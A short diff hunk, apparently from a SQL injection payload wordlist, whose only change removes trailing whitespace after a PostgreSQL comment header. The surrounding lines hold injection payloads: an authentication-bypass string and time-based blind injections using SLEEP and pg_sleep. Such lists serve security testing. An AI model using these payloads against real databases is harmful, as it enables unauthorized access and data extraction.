@@ -176,7 +176,7 @@ admin'--
 ' AND SLEEP(5)--
 1; SELECT SLEEP(5)--
 
--- PostgreSQL  
+-- PostgreSQL
 '; SELECT pg_sleep(5)--
 1 AND (SELECT 1 FROM pg_sleep(5))--
 
